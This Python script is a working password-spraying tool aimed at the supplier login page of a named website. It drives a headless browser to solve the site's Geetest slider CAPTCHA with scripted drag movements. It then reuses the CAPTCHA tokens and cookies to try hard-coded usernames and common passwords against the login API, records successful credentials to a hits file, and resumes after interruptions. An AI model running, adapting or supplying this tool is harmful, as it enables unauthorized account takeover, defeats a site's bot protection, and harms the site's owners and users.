#!/usr/bin/env python3
"""qq1.lol sup turbo — solve Geetest once, spray passwords via API"""
import json
import os
import time
from datetime import datetime
from pathlib import Path

import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "sup_turbo.log"
HITS = OUT / "sup_hits.txt"
PROGRESS = OUT / f"sup_turbo_progress_{os.environ.get('SUP_WORKER', '0')}.json"

USERS = os.environ.get("SUP_USERS", "admin,buyi,buyiq,root,test,sup,supplier,布衣,qq1").split(",")
PASSWORDS = [
    "admin", "123456", "123456789", "admin123", "admin888", "buyi", "buyiq",
    "qq1", "qq123456", "password", "111111", "666666", "888888", "123123",
    "admin@123", "Admin123", "a123456", "1234567890", "admin666", "buyi123",
    "buyi888", "qqkqq", "830603", "123456789s", "root", "test123", "qwerty",
    "admin2024", "admin2025", "admin2026", "ruoyi123", "Lxsj@123",
    "12345678", "654321", "abc123", "password1", "admin@888", "buyi2026",
]
SPRAY_DELAY = float(os.environ.get("SUP_SPRAY_DELAY", "0.15"))
CAPTCHA_WAIT = int(os.environ.get("SUP_CAPTCHA_WAIT", "18"))


def log(msg):
    line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def load_progress():
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text())
        except Exception:
            pass
    return {"user_idx": 0, "pwd_idx": 0}


def save_progress(ui, pi):
    PROGRESS.write_text(json.dumps({"user_idx": ui, "pwd_idx": pi}))


def make_driver():
    opts = Options()
    headless = os.environ.get("SUP_HEADLESS", "1") != "0"
    if headless:
        opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--window-size=1280,900")
    opts.add_argument("--page-load-strategy=eager")
    opts.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
    opts.page_load_strategy = "eager"
    try:
        return webdriver.Chrome(options=opts)
    except Exception:
        return webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=opts)


def solve_geetest(driver):
    time.sleep(2)
    # click geetest button to open challenge
    try:
        for sel in [".geetest_radar_tip", ".geetest_wait", ".geetest_logo", "#captcha_text", ".geetest_holder"]:
            els = driver.find_elements(By.CSS_SELECTOR, sel)
            if els:
                els[0].click()
                time.sleep(1)
                break
    except Exception:
        pass
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for iframe in iframes:
            if "geetest" in (iframe.get_attribute("src") or ""):
                driver.switch_to.frame(iframe)
                break
        for sel in [".geetest_slider_button", ".geetest_btn", "[class*='slider']"]:
            els = driver.find_elements(By.CSS_SELECTOR, sel)
            if els:
                btn = els[0]
                # human-like slide
                chain = ActionChains(driver)
                chain.click_and_hold(btn).pause(0.3)
                for dx in [50, 80, 60, 70]:
                    chain.move_by_offset(dx, 0).pause(0.05)
                chain.release().perform()
                time.sleep(2)
                break
        driver.switch_to.default_content()
    except Exception as e:
        log(f"  slider err: {e}")
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

    deadline = time.time() + CAPTCHA_WAIT
    while time.time() < deadline:
        try:
            data = driver.execute_script("""
                return {
                    c: document.querySelector('input[name=geetest_challenge]')?.value || '',
                    v: document.querySelector('input[name=geetest_validate]')?.value || '',
                    s: document.querySelector('input[name=geetest_seccode]')?.value || ''
                };
            """)
            if data and data.get("v"):
                return data
        except Exception:
            pass
        time.sleep(0.5)
    return None


def api_login(session, user, pwd, geo):
    data = {"user": user, "pass": pwd}
    if geo:
        data.update({
            "geetest_challenge": geo["c"],
            "geetest_validate": geo["v"],
            "geetest_seccode": geo["s"],
        })
    r = session.post(f"{BASE}/sup/ajax.php?act=login", data=data, timeout=12)
    try:
        return r.json()
    except Exception:
        return {"raw": r.text[:100]}


def spray_passwords(session, user, geo, start_pi=0):
    for pi, pwd in enumerate(PASSWORDS[start_pi:], start_pi):
        resp = api_login(session, user, pwd, geo)
        code = resp.get("code")
        msg = resp.get("msg", "")
        if code == 0:
            log(f"*** HIT {user}:{pwd} ***")
            with open(HITS, "a") as f:
                f.write(f"{user}:{pwd}\n")
            return True, pi + 1
        if "密码" in msg and "空" not in msg:
            log(f"  {user}:{pwd} -> wrong_pwd ({msg[:40]})")
        elif "验证" in msg:
            log(f"  {user}:{pwd} -> captcha_expired ({msg[:40]})")
            return False, pi  # need re-solve
        else:
            log(f"  {user}:{pwd} -> {msg[:50]}")
        save_progress(USERS.index(user), pi + 1)
        time.sleep(SPRAY_DELAY)
    return False, len(PASSWORDS)


def main():
    prog = load_progress()
    ui_start = prog["user_idx"]
    log(f"=== sup turbo start user_idx={ui_start} spray_delay={SPRAY_DELAY}s ===")

    http = requests.Session()
    http.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Referer": f"{BASE}/sup/login.php",
        "X-Requested-With": "XMLHttpRequest",
    })

    driver = make_driver()
    try:
        for ui in range(ui_start, len(USERS)):
            user = USERS[ui]
            start_pi = prog["pwd_idx"] if ui == ui_start else 0
            while start_pi < len(PASSWORDS):
                log(f"--- {user} pwd_idx={start_pi} solving geetest ---")
                driver.get(f"{BASE}/sup/login.php")
                time.sleep(1)
                try:
                    driver.find_element(By.NAME, "user").clear()
                    driver.find_element(By.NAME, "user").send_keys(user)
                    driver.find_element(By.NAME, "pass").clear()
                    driver.find_element(By.NAME, "pass").send_keys("probe123")
                except Exception:
                    pass
                geo = solve_geetest(driver)
                if not geo:
                    log("  geetest fail, retry in 5s")
                    time.sleep(5)
                    continue
                log(f"  geetest ok validate={geo['v'][:16]}...")
                # copy cookies to requests session
                for c in driver.get_cookies():
                    http.cookies.set(c["name"], c["value"])
                hit, next_pi = spray_passwords(http, user, geo, start_pi)
                if hit:
                    return
                if next_pi >= len(PASSWORDS):
                    break
                start_pi = next_pi  # captcha expired, re-solve
    finally:
        try:
            driver.quit()
        except Exception:
            pass
    log("=== sup turbo done, no hit ===")


if __name__ == "__main__":
    main()
